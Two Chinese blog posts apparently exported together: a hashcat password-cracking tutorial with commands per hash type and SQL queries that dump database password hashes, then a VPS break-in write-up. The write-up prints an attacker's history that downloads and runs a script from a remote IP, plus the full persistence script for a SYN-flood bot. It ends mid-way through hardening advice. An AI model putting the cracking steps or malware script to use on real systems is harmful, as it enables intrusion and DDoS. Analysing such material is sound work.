掩码是个非常灵活的东西,你可以把它放到任何你想放的位置上,甚至,你愿意的话,也可以把自己想跑的一些掩码规则都事先放到一个文件中,然后以.hcmask命名,加载就可以让hashcat自动跑了,这样用起来比较方便,省的后期经常需要人为干预,后续会为大家简单演示下 12345678l | abcdefghijklmnopqrstuvwxyz 纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ 纯大写字母d | 0123456789 纯数字h | 0123456789abcdef 常见小写子目录和数字H | 0123456789ABCDEF 常见大写字母和数字s | !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ 特殊字符a | ?l?u?d?s 以上所有字符b | 0x00 - 0xff 可能是用来匹配像空格这种密码的比如,下面的例子: 12?l?l?l?l?l?l?d?d?d?d 表示6位小写子目录4位数字组成的密码,注意这里的位置全部都是一一对应的de?l?d?s56pos 表示由de加一位小写字母加一位数字加一位特殊字符后面跟上56pos组成的密码当然,你也可以自定义字符集规则,注意,可以连续指定多个不同的规则集 1234-1, –custom-charset1 | CS | User-defined charset ?1 | -1 ?l?d?u-2, –custom-charset2 | CS | User-defined charset ?2 | -2 ?l?d?s-3, –custom-charset3 | CS | User-defined charset ?3 |-4, –custom-charset4 | CS | User-defined charset ?4比如,下面的例子: 12-1 ?l?s ?1?1?1?1?1 表示五位由特殊字符和小写字母组成的密码-1 ?d?l -2 ?d?l?u -3 ?l?u ?1?2?3 表示密码的第一位可能是小写字母或者数字,第二位可能是大小写字母或者数字,第三位可能是大或小写字母0x07 不同破解模式下的具体应用场景,用的时候需要稍微注意下语句格式(暂以破解最普通的md5 hash为例) 基于纯字典的爆破模式 Straight: 12 hashcat –force -a 0 -m 0 hash.txt /home/weak_wordlist/pass/weakpass.txt -o res.txtcat res.txtwordlist.png 稍微智能一些的字典爆破模式,需要事先把密码中有可能包含到的单词都放到字典中 Combination: 比如,我有两个这样的字典,字典包含如下的字符串,而我的实际密码是adminpass [ 字典文件可同时有很多个,不过那也意味你的组合也会特别多,速度就会慢 ],实际破解就可以像下面就这样写 1 cat dic1.txt dic2.txt combination_dic.png1 hashcat –force -a 1 -m 0 hash.txt dic1.txt dic2.txtcombination_res.png 基于纯掩码的爆破模式,其实就是尝试逐个位破解,一般人的密码设置习惯大都是基于大小写字母数字这种形式的,如果hash实在比较多,可以尝试从指定的位数开始一位位的将大小写特殊字符轮询这跑,可以节省一些时间 [Brute-force]: 破解九位纯小写字母组成的密码hash,可以看到在我双CPU双核的虚拟机中破解这种只是两三分钟的事情 1 hashcat –force -a 3 -m 0 hash.txt ?l?l?l?l?l?l?l?l?l 前三位小写字母,后四位数字 1 hashcat –force -a 3 -m 0 hash.txt ?l?l?l?d?d?d?d 10位纯数字,其实大家都很清楚,底层对数字的处理速度是最快的1 hashcat –force -a 3 -m 0 hash.txt ?d?d?d?d?d?d?d?d?d?d7位小写字母加数字的随机组合brute-force-71.png1 hashcat –force -a 3 -m 0 hash.txt -1 ?l?d ?1?1?1?1?1?1?1除了上面这种常规的掩码写法,你也可以这样,比如,你明确的知道密码的某一位或者几位上可能是什么字符,你也可以这样写掩码,假设密码明文为loveshare,你实际破解的掩码就可以这样写,它只会去破解有掩码的位,速度自然就非常快了brute-force-loveshare.png 1 hashcat –force -a 3 -m 0 hash.txt ?l?lve?l?la?l?l基于字典和掩码配合的爆破模式,把可能存在的字符串事先写到字典中,然后hashcat在破解的时候会把后面所有的掩码组合跟前面的字典每行中的字符串进行拼接,直到猜解出明文,下面也是一样,只不过下面是把掩码放在了前面字典放在了后面Hybrid Wordlist + Mask,其实,它想表达的意思非常简单,如hybrid wordlist + mask.png 1234dic1.txt 中的内容是这样的adminroot….实际的明文密码是这样的 1adminpass123那你实际破解的掩码,就可以这样写 1 hashcat –force -m 0 hash.txt -a 6 dic1.txt -1 ?l ?l?1?1?1?d?d?d其实,它实际的拼接过程就相当于下面这样,直到最后就会撞到adminpass123 123admin?l?1?1?1?d?d?dpass?l?1?1?1?d?d?d…下面是多字典实例 1 hashcat –force -m 0 hash.txt -a 6 dic1.txt dic2.txt -1 ?l ?l?1?1?1?d?d?d基于掩码和字典配合的爆破模式 [Hybrid Mask + Wordlist]: 1 hashcat –force -m 0 hash.txt -1 ?l?d ?1?1?1?1 -a 7 dic1.txt dic2.txt基于increment的自动变长模式,下面的意思就表示自动破解4到8位由小写子目录和数字组成的密码hash: 1 hashcat –force -a 3 -m 0 hash.txt –increment –increment-min=4 –increment-max=8 -1 ?l?d0x08 下面是一些我们可能会经常碰到的散列掩码爆破实例,自己机器性能不是太好,为了节省时间,所以实际设置的密码都非常简单,大多是9位以内的小写字母加数字 破解最普通的md5 hash [可能也是大家用的最多的散列,本身并非加密算法,大多是用来做hash校验用的,除了常规网站后台管理密码,另外,很多常见服务器端工具的默认加密都是基于此类型,如,filezilla,等等…],下面表示破解8位由小写字母数字组成的密码: 1 hashcat –force -a 3 -m 0 hash.txt -1 ?l?d ?1?1?1?1?1?1?1?1破解 sha系列 hash [绝大多数linux发行版的默认用户密码加密类型都是基于sha系列的变种]: 纯sha1,五位小写字母: 1 hashcat –force -a 3 -m 100 hash.txt ?l?l?l?l?l纯sha224,五位小写字母: 1 hashcat –force -a 3 -m 1300 hash.txt ?l?l?l?l?l纯sha256,五位小写字母: 1 hashcat –force -a 3 -m 1400 hash.txt ?l?l?l?l?l纯sha384,五位小写字母: 1 hashcat –force -a 3 -m 10800 hash.txt ?l?l?l?l?l纯sha512,五位小写字母[速度稍慢]: 1 hashcat –force -a 3 -m 1700 hash.txt ?l?l?l?l?l破解 linux 系统用户密码hash[可能稍微有些慢,相比之下用john这也是一款比较好用的hash破解工具,后续我们还会单独说跑,效果可能会更好一些]: 1 hashcat –force -a 3 -m 1800 hash.txt ?l?l?l?l?l破解 win 2008 系统用户的 ntlm hash [实际破解中只需要破解ntlm部分的值即可,lm的值就不用了,另外,还有域中的各类证书散列类型破解基本都是如此,这里就不一一举例了]: 1 hashcat –force hash.txt -m 1000 -a 6 dic1.txt ?s?s?s?d?d?d破解 mysql 4/5.x 数据库用户hash[ 记得实际破解的时候把hash开头的*去掉,要不然可能识别不出来 ]: 12 select * from mysql.user\\G;hashcat –force hash.txt -m 300 -a 3 ?l?l?l?l破解 mssql系列[2005/2008/2012] 数据库用户hash: 12 SELECT name, password_hash FROM master.sys.sql_loginshashcat –force hash.txt -m 132 -a 3 ?l?l?l?l?l?d?d?d破解 pgsql 数据库用户hash [ 其实是md5的变种,跑的时候记得把hash开头的md5去掉,不过自己在实际跑的过程中,暂时还有些问题,如果用普通的md5来跑,跑出来的明文和我实际的密码还有一些出入 ]: 12 SELECT usename, passwd FROM pg_shadow;hashcat –force hash.txt -m 12 -a 3 ?l?l?l?l?l?d?d?d破解 oracle 11g 数据库用户hash[记得倒数第20个字符加 : ,要把盐区分出来]: 123 SELECT name,spare4 FROM sys.user$;S:EC9E3B871377F217DCFA18F1B84F2F2EACFF9299:AB4B59A17C93F8CB4840 hashcat –force hash.txt -m 112 -a 3 ?l?l?l?l?l破解 wpa/wpa2 握手包中的无线密码hash [可能需要你自己先把握手包用wpaclean整理一下,再用aircrack输出成hashcat认识的散列格式,非常实用,具体内容请查看无线破解相关文章]: 1 hashcat -a 3 -m 2500 wpahash.hccap ?l?l?l?l?l?l?l?l破解 wordpress 4.x 用户密码hash [实际测试版本 4.7.4],具体加密方式在wp-includes\\class-phpass.php 文件中的HashPassword()函数中 1 hashcat –force hash.txt -m 400 -a 3 ?l?l?l?d?d?d破解 joomla &lt; 2.5.18 用户密码hash [实际测试版本 joomla 2.5.1],具体加密方式在 libraries\\joomla\\user\\helper.php 文件中的genRandomPassword()和getCryptedPassword()函数中 1 hashcat –force hash.txt -m 11 -a 3 ?l?l?l?l?l破解 joomla &gt; 2.5.18 用户密码hash [跟上面wp的散列类型其实是一样的,但自己实际跑的时候hash却没有识别出来,暂时还没找到问题的根源,如果有成功的朋友,麻烦也告诉我一下,实际测试版本joomla 3.7],具体加密方式在 libraries\\joomla\\user\\helper.php 文件中的genRandomPassword()和getCryptedPassword()函数中 1 hashcat –force hash.txt -m 400 -a 3 ?l?l?l?l?l破解drupal 7.x 用户密码hash [ 实际测试版本7.5.4 ],具体加密方式在 includes\\password.inc 文件中的_password_crypt函数中 1 hashcat –force -m 7900 hash.txt -a 3 ?l?l?l?l?l破解discuz 3.x 用户密码hash [实际测试版本discuz x3.2 ,暂时还有些问题],具体加密方式在 uc_client\\model\\user.php 文件中的add_user函数中 1 hashcat –force -m 2611 hash.txt -a 3 ?l?l?l?l?l破解phpbb3 用户密码hash [实际测试版本 phpbb3.2,暂时还有些问题]: 1 hashcat –force -m 400 hash.txt -a 3 ?l?l?l?l?l?d?d?d破解 htpasswd 密码hash [也有些问题]: 1 hashcat –force -m 1500 hash.txt -a 3 ?d?d?d?d?d?d破解Adobe PDF 11文件密码hash,后面针对这种包公套件的加密破解,都需要自己先把hash提取出来,在john基本都有对应的hash提取脚本,可直接用,后续我们再说,下面几种类型的破解有几个还有一些问题,不过,我们后面用john来搞就好了 1 hashcat –force -m 10700 hash.txt -a 3 ?d?d?d?d?d?d破解 Office 2013 文件密码hash: 1 hashcat –force -m 9600 hash.txt -a 3 ?d?d?d?d?d?d破解 RAR5压缩文件密码hash: 1 hashcat –force -m 13000 hash.txt -a 3 ?d?d?d?d?d?d破解 7-Zip压缩文件密码hash: 1 hashcat –force -m 11600 hash.txt -a 3 ?d?d?d?d?d?d破解 WinZip压缩文件密码hash: 1 hashcat –force -m 13600 hash.txt -a 3 ?d?d?d?d?d?d破解grub 2.x hash: 1 hashcat –force -m 7200 hash.txt -a 3 ?d?d?d?d?d?d破解 TrueCrypt 密码hash[曾经还算是个比较强的磁盘加密工具,自己也一直在用,只不过后来发生了一段故事,导致它官方自爆不再安全,也是尴尬]: 1 hashcat –force -m 62XY hash.txt -a 3 ?d?d?d?d?d?d破解 Skype 密码hash [需要自己从对应的xml文件把hash提取出来,很抱歉,我没成功]: 1 hashcat –force -m 23 hash.txt -a 3 ?d?d?d?d?d?d0x09 关于GPU参数优化 [ 这次根本没用到 ]和自定义破解规则[比较复杂,但更智能灵活,可这也就意味着速度就..嘿嘿,你懂的]方面的东西,这里暂时就不提了,仅仅作为hash破解入门,这些差不多足以应对你日常的各种破解需求了 0x10 关于在实际破解中自己的一些建议,暂以大批量hash爆破为例[事先没有任何密码规律可循,只能盲测的那种情况] 1234首先,弱口令字典先走一遍再说其次,跑掩码,把所有想跑的掩码全部事先放到.hcmask文件中,然后加载它自动跑,上面已有介绍或者,如果只是针对单条hash,在上述方法都跑不出来的情况下,可以去仔细分析下目标的密码设置规律,再尝试组合,可能效率会高一点,但那也只是可能最后,如果你自己真的有能力,可以想办法把它做成分布式快速hash破解产品[密码机],然后拿到市面上去卖,也是完全可行的,毕竟已经有很多成功的案例,只不过你可能更多应该考虑下怎么比别人做的效率更高,更易用,不然,很难有市场0x11 关于密码安全的一些个人建议 1234567密码要保持足够的随机性,绝不要让别人轻易分析出的你密码设置习惯和规律,有很多的字典生成工具中的算法就是根据这个来的,不然,很快就会被别人撞到密码密码字符要足够混乱,严禁将单纯的大小写字母,数字,作为密码,在保证密码随机性的前提下,密码中最好同时包含有数字,大小写字母,特殊字符保证必要的密码长度,推荐至少15位以上,我们也看到了,对于那种8,9位的纯字母数字的密码,在hashcat面前基本是不堪一击的,当然啦,等量子或者光子计算机技术成熟以后,估计现有的各种加密算法,基本要沦陷一大半了,另外,看到很多说密码要经常改,其实,个人认为在你密码没有任何泄露而且足够复杂的前提下,根本没有必要经常改,不过,这也是建立在你没有被人搞进去的大前提下的,密码即使再复杂,如果一下被人抓到了明文,也就是个摆设了,个人一直都认为安全本来就是一个多维度的东西,渗透者需要的有时只是一个有突破性的点,而防御者却要防御所有可能被攻破的维度,所以,一个优秀的防御者,在此之前也一定是一个优秀渗透者,个人坚信,”运维会的那套东西,你要比他更精通,你才有可能搞定他,开发会的东西,你要比他写的更熟练积累的更多,才有可能挖到有价值的洞,天天嘴上说架构安全说的天花乱坠,不说一定要实际生产环境,甚至自己在本地连测试架构的环境都没部署过,怎么可能安全呢,说说也就只能是说说了”,实在不好意思,多啰嗦了一点,个人说话可能有些犀利,大家别介意哈,也许以后你们会习惯我这种风格的,不喜欢废话, 坦诚,一针见血,既然说就说点儿上嘛, 噱头,虚头巴脑装逼的东西,在我这儿基本不会有,个人比较偏向实战,一直坚信,技术没有好坏,能搞进去就行,说的再高端,做题做的再好,如果不能用于真实的渗透场景,意义何在呢,对于渗透来讲,结果无非两个,”进去了或者没进去”,至于方法,没人管你严禁一个密码同时用于n个账号登陆,不然,别人只需要拿着这一个密码就可以到你经常去的其它网站上把你的私人信息翻个顶儿朝天了,想必很多人为了图方便[起码在很久很久以前,自己也这样做过],可能都会这样做,很显然这是一种非常傻叉的行为,比如,专门针对此的”撞库攻击”,其实,说到这里还想再多提一点信息搜集里的东西,”水坑攻击”,其实,就是搜集的社交关系网,然后,在你经常去的一些偏门的站点上等着你,要么社工,要直接把那个站搞下来,嘿嘿……关于这些东西,后续还会有专门篇幅说,别着急严禁把密码随意泄露给别人,这年头,社工几乎是无处不在的认清钓鱼站,看清楚再敲,不然,账号密码就被丢到别人的机器上了严禁把明文密码直接写到文件保存到系统里, 这等于给别人留了个后门,一条命令就什么都有了 0x12 后话: 纵观全文,单单就工具使用来讲,还是蛮简单的,希望你也是这种感觉,那我文章的目的就达到了,嘿嘿……[虽然过程中还存在着一些瑕疵,待后期找到原因会再补充上来],作为使用基本也不存在什么技术含量,真正的难点可能还是在于对各种加密算法加密细节的理解[这里没有涉及的原因,是我怕把大家带沟里了,所以,想想还是算了,我们是在讲渗透,而非专门研究加密解密]和工具自身的破解算法上,还是那句话,我们并不是为了专门研究密码学[这么复杂的数学问题还是留给那些聪明秃顶的人去搞吧,我们只需要躺着享用他们的成果就好了,站在他们的肩膀上,也许能走的更快,毕竟,我们最终的目想获取目标机器的最高权限,手段不限,而hash破解只是这其中的一个环节而已]或者编写此类的hash破解工具[千万别偏离了方向,务必懂得取舍,不然容易”走火入魔”],对于渗透者来说,我们只是想利用手里现有的各种凭证,来继续下一步的渗透动作,仅此而已,所以,大可不用在这些工具上浪费太多的时间,能快速上手,并且能跑出来自己想要的东西才是主要目的,与其花那么长的时间在这种工具上,不如花更多的时间好好想想该如何’搞’到这些hash才是正途,搞到hash起码还能说明你离目标又近了一步,连hash到搞不到才是真正的尴尬,不忘初心,方得永生!说这么多绝不是在教唆怂恿大家去干坏事儿哈,由此文章所引发的一切后果,与本公众号及本文作者无任何关系,本质还是想让大家用别人干坏事儿的方法来保护我们自己,都是成年人,不要做傻逼事儿,相信你会懂的,如果你觉得这些东西对你有用,请持续关注本人公众号,可能暂时还没什么文章,不过后续就可能会有大批你感兴趣的文章了,嘿嘿…写文章确实不容易,都不是信手拈来的,要一边测,一边截图,一边写,生怕写错,所以出文章的速度可能大打折扣,当然啦,我也可以写的很快,很粗糙,而且没有经过任何实战的考量就告诉大家,不过,我自己还是想尽量给大家一些更实用的东西,凭空意淫出来的东西,可能对大家并没有什么实质性的帮助,很久之前,在某个前辈的博客上,看到过这么一句话,觉得对我的触动一直都挺大的,这里也分享给大家共勉,”我所说过的我都做过”,希望大家谅解, hash破解的东西还没完,后续还会紧接着奉上,转载请务必注明出处,谢谢,欢迎大家一起交流","categories":[],"tags":[]},{"title":"服务器被黑之后的心路历程","slug":"服务器被黑之后的心路历程","date":"2018-03-30T06:59:34.000Z","updated":"2018-03-30T07:09:32.131Z","comments":true,"path":"2018/03/30/服务器被黑之后的心路历程/","link":"","permalink":"http://yoursite.com/2018/03/30/服务器被黑之后的心路历程/","excerpt":"","text":"服务器被黑之后的心路历程 不久前读了一篇黑客故事（ 高手对决 – 博客服务器被黑的故事），读完此文后，才意识到我的机器是处于裸奔状态，便饶有兴致地去服务器检查了一下日志。发现还真有人在尝试对我的机器进行暴力破解（一下简称爆破），而且攻势还挺猛，当天就有1w+的暴力尝试！但是当时并没有特别去在意，被黑这种事情应该不会发生的……吧…… 只是，几天之后的某一天（2月3号）深夜，趴在床上休闲的看邮件时，收到了DO在1月29号发的警告邮件（DO：Digital Ocean, 一个vps主机提供商，这个博客就是架设在我在DO的vps上）： We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users. To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involved… 什么情况！我的服务器被黑了！！？DO把我的服务封了！！？立马打开浏览器访问我的博客主页，果然挂了。然后尝试ssh登录到主机，连接不上，果然主机被封了！而且这邮件是五天前发的，我现在才知道！吓得当时我的表情是这样的： 寻找线索第二天起床之后，立马跑到自习室进入忘我模式，开始追查原因！ 服务器网络被禁，没法ssh登录。幸好， DO 提供了Web console接口，可以通过Web界面来登录服务器。 “DO把我服网络封禁了，那贼现在应该无法控制我的服务器”，心里再一次暗想着，“现在暂时无需修改密码来防止主机被再次控制，先先找出问题所在吧。” 再次打开邮件，观察DO提供的报警信息： We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users. To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involved… “难道服务器被劫持作为肉鸡来攻击其它的网络了！？”，那是一头雾水啊，完全不清楚攻击者究竟利用我服做了什么事情，看起来好像是被当肉鸡了哎 ╮(╯▽╰)╭。 所以接下来理所当然的去查看有问题的进程了。 既然是traffic flood，那就先从网络检查起。 $ sudo ss -pState Recv-Q Send-Q Local Address:Port Peer Address:PortSYN-SENT 0 4 127.0.0.1:36512 183.60.149.202:43200users:((“icnanker”,14519,4))…不出所料果然看到了一个很可疑的程序：icnanker，它在不停的尝试往183.60.149.202:43200发送tcp syn包！立马搜这个IP的信息，只发现这是东莞的一个IP。那继续吧，先找出所有有问题的进程再说。 果然在进程列表中找到了三个很可疑的进程： $ ps aux(…)root 13648 0.0 0.1 23656 556 ? Ss Jan28 0:43 /etc/init.d/apache2.shroot 14519 0.0 0.2 85872 1208 ? S Jan28 23:41 /usr/bin/icnankerroot 26595 0.0 0.2 61364 1224 ? S Jan28 0:00 /usr/bin/.sshd(…)第一，我没有装apache，apache2.sh这样的名字实在是太可疑了。 第二，.sshd这个进程的名字更可疑，sshd守护进程是sshd，伪装得太不像了。 第三，只有这三个进程都是在Jan28启动的，也就是1月28号，这让我联想到29号造成的traffic flood。肯定有问题。 接着下意识的去翻阅登录日志： grep “Accepted” /var/log/auth.log.1(…)Jan 26 16:55:49 mon sshd[13955]: Accepted password for root from 61.160.247.8 port 1604 ssh2Jan 28 17:12:03 mon sshd[30407]: Accepted password for root from 61.166.50.23 port 3343 ssh2(…) grep “Jan 2[5-8] .sshd.Failed” /var/log/auth.log.1 | wc 21806 355851 2333557！！！！ Jan 26和 Jan 28都有人在我的机器上登录过root账号！Ip来源发现分别是云南和江苏的，也是非常诡异。接着让我更吃惊的是从Jan 25到Feb 28，共有2w+的暴破尝试！ 在看到这些结果的瞬间其实我就明白了为何我会被攻破——因为我的密码设置得非常非常简单，简单到和“123456”这样的密码差不多。这个时候我的表情是这样的： 立马切换到root用户，查看root命令记录，看看能不能追踪到这个家伙在我机器上做过什么，同时在心里像上帝祈祷希望他没擦去脚印。 history(…) 4 cp /usr/bin/wget /usr/bin/vget 5 cp /usr/bin/chattr /usr/bin/lockr 6 chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget 7 lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget 8 chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr 9 vget http://183.60.149.202:8080/apache2.sh 10 mv /root/apache2.sh /etc/init.d/apache2.sh 11 chmod 0755 /etc/init.d/apache2.sh 12 nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp; 13 lockr +i /etc/init.d/apache2.sh 14 vi /etc/rc.local 15 lockr +i /etc/rc.local 16 less /etc/init.d/apache2.sh感慨万千，万千感慨，“还好，这个傻逼没有擦去脚印”，哈哈哈哈哈。。 做抱拳状，站起，出自习室，接开水，回来，继续！ “我需要知道，这家伙究竟对我的机器干了些什么！” 从上面的命令记录来看，/etc/init.d/apache2.sh这个脚本有很大的嫌疑，查看脚本内容： cat /etc/init.d/apache2.sh#!/bin/shwhile [ 1 -gt 0 ];doGet=”/usr/bin/vget”Lok=”/usr/bin/lockr”Bak=”/usr/bin/.filebak”hosts=”/etc/hosts.bak”File=”/usr/bin/icnanker”if [ ! -f “$hosts” ];then cp -f /etc/hosts.deny /etc/hosts.bak lockr +i /etc/hosts.bakfiif [ ! -f “$Lok” ];then cp -f /usr/bin/chattr /usr/bin/lockr cp -f /usr/bin/chattr /usr/bin/.locks cp -f /usr/bin/.locks /usr/bin/lockr chmod 0755 /usr/bin/lockr chmod 0755 /usr/bin/.locks lockr +i /usr/bin/lockr lockr +i /usr/bin/.locksfiif [ ! -f “$Get” ];then cp -f /usr/bin/wget /usr/bin/vget cp -f /usr/bin/wget /usr/bin/.bget cp -f /usr/bin/.bget /usr/bin/vget chmod 0755 /usr/bin/vget chmod 0755 /usr/bin/.bget lockr +i /usr/bin/vget lockr +i /usr/bin/.bgetfiExist=ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;if [ -z “$Exist” ];then lockr -i /usr/bin/.filebak lockr -i /usr/bin/icnanker chmod 0755 /usr/bin/.filebak chmod 0755 /usr/bin/icnanker if [ ! -f “$File” ];then if [ ! -f “$Bak” ];then rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1 vget -P /etc/init.d/ vget http://183.60.149.202:8080/icnanker mv /etc/init.d/icnanker /usr/bin/icnanker else cp -f /usr/bin/.filebak /usr/bin/icnanker fi fi pkill icnanker;pkill icnanker chmod 0755 /usr/bin/icnanker lockr +i /usr/bin/icnanker /usr/bin/icnankerfiif [ ! -f “$Bak” ];then cp -f /usr/bin/icnanker /usr/bin/.filebak chmod 0755 /usr/bin/.filebak lockr +i /usr/bin/.filebakfichmod 0 /usr/bin/wgetlockr +i /usr/bin/wgetchmod 0 /usr/bin/chattrlockr +i /usr/bin/chattrchmod 0 /usr/lib/sftp-serverlockr +i /usr/lib/sftp-serverlockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.denysleep 30done仔细看下来，这应该是”icnanker”的后台守护程序，确保”icnanker”一直在运行。 那”icnanker”究竟是干什么的，究竟在我的系统上干了什么，服务器还有什么其他的“坏家伙”在？ 尝试打开“icnanker”，看看“icnanker”的内容，发现它是二进制的，无法查看该木马的具体作用。但是根据 DO 的检测、apache2.sh脚本内容以及”icnanker”一直在进行着的大量tcp链接尝试可以看出，似乎这是一个DDoS木马，syn flood。 于是开始在网络上搜索该木马的详细信息，一番尝试之后，还是没能找到关于这个木马的详细信息，“那就先放着，先揪出其他木马再说”。 全城搜查此时的我有点慌乱和无头绪，“对病毒一点都不了解呢”，“不过，这点问题可难不倒我，移步google！” 经过一番查找之后，发现了 clamAV 这个工具，一个很popular的开源病毒引擎，能够扫描检测木马、病毒和恶意程序，正乃我所需啊！！ 马上用 clamAV 神器扫描全站文件，果然还发现了不少其他的木马： /usr/bin/icnanker/usr/bin/.filebak/usr/bin/.sshd/usr/bin/lsof/usr/bin/bsd-port/getty/bin/ps/bin/netstat/bin/ssOh, no！！！ ps, netstat, ss, lsof 这些很常用的监控服务器状态的系统工具全部被掉包了！ “真是危险，要是没有在全机进行病毒搜索的话，很容易就会又被莫名其妙的感染了！”，心里直冒冷汗。 这个时候，我的表情是这样的： 嗯，心情非常沉重。非常沉重。非常非常的沉重。 怀着沉重的心情，开始出其意料的冷静思考，得出以下推断（事实）： 攻击者利用暴破登录服务器，1月26号成功突破，1月28号种下木马，29号开始进行tcp syn flood,flood持续一段时间后，被DO检测到，封了我的主机。攻击者没有清除日志，没有做对机器有极大破坏性的事情。攻击者不仅仅是种下”icnanker”这一个显而易见的木马，还用一些其他的木马掉包了本机上的关键程序。那么，我需要反抗了。 杀掉木马进程 kill 13648 # 杀掉apache2.shkill 14519 # 杀掉”icnanker”kill 26595 # 杀掉.sshd清除木马 再次查看命令记录和apache2.sh，确定清除木马的步骤： history(…) 4 cp /usr/bin/wget /usr/bin/vget 5 cp /usr/bin/chattr /usr/bin/lockr 6 chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget 7 lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget 8 chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr 9 vget http://183.60.149.202:8080/apache2.sh 10 mv /root/apache2.sh /etc/init.d/apache2.sh 11 chmod 0755 /etc/init.d/apache2.sh 12 nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp; 13 lockr +i /etc/init.d/apache2.sh 14 vi /etc/rc.local 15 lockr +i /etc/rc.local 16 less /etc/init.d/apache2.sh cat /etc/init.d/apache2.sh#!/bin/shwhile [ 1 -gt 0 ];doGet=”/usr/bin/vget”Lok=”/usr/bin/lockr”Bak=”/usr/bin/.filebak”hosts=”/etc/hosts.bak”File=”/usr/bin/icnanker”if [ ! -f “$hosts” ];then cp -f /etc/hosts.deny /etc/hosts.bak lockr +i /etc/hosts.bakfiif [ ! -f “$Lok” ];then cp -f /usr/bin/chattr /usr/bin/lockr cp -f /usr/bin/chattr /usr/bin/.locks cp -f /usr/bin/.locks /usr/bin/lockr chmod 0755 /usr/bin/lockr chmod 0755 /usr/bin/.locks lockr +i /usr/bin/lockr lockr +i /usr/bin/.locksfiif [ ! -f “$Get” ];then cp -f /usr/bin/wget /usr/bin/vget cp -f /usr/bin/wget /usr/bin/.bget cp -f /usr/bin/.bget /usr/bin/vget chmod 0755 /usr/bin/vget chmod 0755 /usr/bin/.bget lockr +i /usr/bin/vget lockr +i /usr/bin/.bgetfiExist=ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;if [ -z “$Exist” ];then lockr -i /usr/bin/.filebak lockr -i /usr/bin/icnanker chmod 0755 /usr/bin/.filebak chmod 0755 /usr/bin/icnanker if [ ! -f “$File” ];then if [ ! -f “$Bak” ];then rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1 vget -P /etc/init.d/ vget http://183.60.149.202:8080/icnanker mv /etc/init.d/icnanker /usr/bin/icnanker else cp -f /usr/bin/.filebak /usr/bin/icnanker fi fi pkill icnanker;pkill icnanker chmod 0755 /usr/bin/icnanker lockr +i /usr/bin/icnanker /usr/bin/icnankerfiif [ ! -f “$Bak” ];then cp -f /usr/bin/icnanker /usr/bin/.filebak chmod 0755 /usr/bin/.filebak lockr +i /usr/bin/.filebakfichmod 0 /usr/bin/wgetlockr +i /usr/bin/wgetchmod 0 /usr/bin/chattrlockr +i /usr/bin/chattrchmod 0 /usr/lib/sftp-serverlockr +i /usr/lib/sftp-serverlockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.denysleep 30done哼，╭(╯^╰)╮，居然敢这样玩我。这几行命令和脚本试图干扰我把病毒从机器上删除哎： 第一步， 将/usr/bin/chattr复制到/usr/bin/lockr cp /usr/bin/chattr /usr/bin/lockr 第二步， 将chattr变为不可读不可写不可执行的权限 chmod 0 /usr/bin/chattr 第三步， 锁住chattr，让其变为不可修改 lockr +i /usr/bin/chattr 第四步， 锁住所有其他木马，让其不可删除，如icnanker等。 lockr +i /usr/bin/icnanker 第五步， 将木马程序加入系统开机自启脚本（ /etc/rc.local ）中，每次开机自动运行木马。 这样一来， 如果不懂这段逻辑的话， 要删除病毒如icnanker都会被莫名其妙被拒绝了： rm /usr/bin/icnankerrm: cannot remove ‘icnanker’: Operation not permitted幸好， 我这个人有非常可怕的耐心。马上去查了chattr是干什么的。原来，linux的文件还能设置一些附带的属性。比如有一个属性’i’，它的意思就是”immutable”，即限制文件不可更改（删除、修改文件内容、改变文件权限等）。那么通过lockr +i /usr/bin/icnanker，给icnanker附上了’i’属性之后，就让我没办法删除icnanker了！ “那把icnanker的’i’属性去除呗”， 这是一个很直接的想法。但是这货为了防止我这么做，还记得吗，它把 chattr 这个工具通过 chmod 0 /usr/bin/chattr命令将chattr的执行权限去除了。换言之，我没法运行chattr来去除icnanker的’i’属性！ 那是不是就没办法删除这些木马了呢？ NO，NO，NO。将计就计就好了。 还记得吗， 上面那段脚本，把/usr/bin/chattr复制到了/usr/bin/lockr。那我直接使用lockr把chattr解锁不就行了？ lockr -i /usr/bin/chattrchmod 755 /usr/bin/chattrchattr -i /usr/bin/icnankerrm /usr/bin/icnanker(…)呵呵，这样，就把攻击者设下的圈套一下就解开了。做到这里我觉得攻击者的智商其实值得商榷的。我在智商上，其实应该更高一筹。小小的自娱自乐了一把。。。 木马，就这样一步一步的全部被我搜集起来，过些时候准备一把火烧了它。 接下来，是思考对策的时候了。这次暴破表面上全是弱口令惹的祸，其实还是因为太懒，明明知道很危险，却存在侥幸心理。“嗯，这次一定要采取全面的安全策略！” 进行一些研究之后，准备从两个大方向入手，防护机制和检测机制。一个是加强安全性，增加他们（hacker）进攻难度。另一个是加强警戒，一旦发现有人入侵，能立马知道并且快速响应。 建立城墙（SSH）登录安全策略 使用强密码！！绝大多数暴破都是因为该死的弱口令！ 设置ssh不允许root登录！因为大多数登录暴破都是对于root用户进行暴破的！ 不要泄露主机用户名等信息！！这主要是为了防止针对性暴破，如果别人知道你的用户名，又对你有一些了解的话，其猜中你密码的概率会大大加大。 检查暴破IP并且封禁之！有个非常好用的工具，其大名为“fail2ban”，它可以扫描主机的登录日志，并且限制单IP失败登录次数，如果超过限制，就会封禁该IP。防火墙 防火墙的作用主要是对外关闭不必要的网络服务，减少由常规程序本身的漏洞而带来的隐患。同样，有一个非常好用的工具，“ufw”，可以非常方便的设置防火墙： ufw 